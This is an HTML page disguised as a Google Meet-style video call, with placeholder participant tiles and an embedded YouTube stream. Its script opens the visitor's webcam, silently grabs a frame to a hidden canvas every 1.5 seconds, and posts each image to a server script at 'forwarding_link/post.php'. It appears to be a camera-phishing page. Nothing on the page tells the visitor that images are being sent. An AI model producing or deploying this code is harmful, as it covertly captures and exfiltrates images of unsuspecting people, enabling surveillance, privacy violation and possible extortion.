<!doctype html>
<html>
<head>
<title>Google Meet Style Video Call</title>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<style>
body {
  font-family: Arial, sans-serif;
  background-color: #f0f0f0;
  margin: 0;
  padding: 0;
  display: flex;
  flex-direction: column;
  align-items: center;
}

#meet-container {
  width: 80%;
  max-width: 1200px;
  background-color: #fff;
  border-radius: 10px;
  box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
  padding: 20px;
  margin-top: 20px;
}

.video-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); /* Adjust minmax for desired video size */
  grid-gap: 10px;
  margin-bottom: 20px;
}

.video-container {
  position: relative;
  background-color: #333; /* Placeholder background */
  border-radius: 5px;
  overflow: hidden;
}

.video-container video {
  width: 100%;
  display: block;
}

.video-container .name-overlay {
  position: absolute;
  bottom: 0;
  left: 0;
  width: 100%;
  background-color: rgba(0, 0, 0, 0.5);
  color: white;
  padding: 5px;
  font-size: 14px;
  text-align: center;
}

#local-video-container { /* Style for the local video (your webcam) */
  border: 2px solid #4285f4; /* Google Meet blue border */
}

/* Optional: Style for the main content area below the videos */
#content-area {
  width: 100%;
  text-align: center;
  padding: 20px;
}

/* Styling for the bottom bar (like Meet's bottom bar) */
#bottom-bar {
  background-color: #f0f0f0;
  padding: 10px;
  text-align: center;
  border-top: 1px solid #ccc;
}

#bottom-bar button {
  padding: 8px 15px;
  margin: 0 5px;
  border: none;
  border-radius: 5px;
  background-color: #ddd;
  cursor: pointer;
}

#bottom-bar button:hover {
  background-color: #ccc;
}

/* Placeholder for icons (replace with actual icon images/svgs) */
#bottom-bar button::before {
  content: "[ICON] "; /* Replace with actual icon */
}

</style>
</head>

<body>
  <div id="meet-container">
    <div class="video-grid">
      <!-- Local Video -->
      <div class="video-container" id="local-video-container">
        <video id="video" playsinline autoplay muted></video>
        <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
        <div class="name-overlay">You</div>
      </div>

      <!-- Placeholder for other participants -->
      <div class="video-container">
        <video playsinline autoplay></video>
        <div class="name-overlay">Participant 1</div>
      </div>

      <div class="video-container">
        <video playsinline autoplay></video>
        <div class="name-overlay">Participant 2</div>
      </div>

      <!-- Add more video-container divs for more participants -->
    </div>

    <div id="content-area">
      <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
    </div>

    <div id="bottom-bar">
      <button>Microphone</button>
      <button>Camera</button>
      <button>Present</button>
      <button>Leave Call</button>
    </div>

  </div>

<script>
function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: 'forwarding_link/post.php',
    dataType: 'json',
    async: false,
    success: function(result){
        // call the function that handles the response/results
    },
    error: function(){
    }
  });
};


'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {

    facingMode: "user"
  }
};

// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}

// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

var context = canvas.getContext('2d');
  setInterval(function(){

       context.drawImage(video, 0, 0, 640, 480);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData); }, 1500);


}

// Load init
init();

</script>

</body>
</html>
